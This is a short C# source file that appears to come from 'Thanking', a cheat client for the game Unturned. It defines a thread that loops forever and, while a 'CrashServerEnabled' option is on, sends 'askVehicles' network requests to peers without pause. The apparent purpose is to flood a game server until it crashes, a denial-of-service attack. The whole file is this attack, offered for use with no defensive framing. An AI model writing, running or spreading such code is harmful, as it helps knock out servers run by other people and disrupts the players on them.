using SDG.Unturned;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Thanking.Attributes;
using Thanking.Options;

namespace Thanking.Threads
{
	public static class CrashThread
	{
		[Thread]
		public static void Start()
		{
			while (true)
			{
				if (MiscOptions.CrashServerEnabled)
					Player.player.channel.send("askVehicles", ESteamCall.PEERS, ESteamPacket.UPDATE_RELIABLE_BUFFER, new object[0]);
			}
		}
	}
}
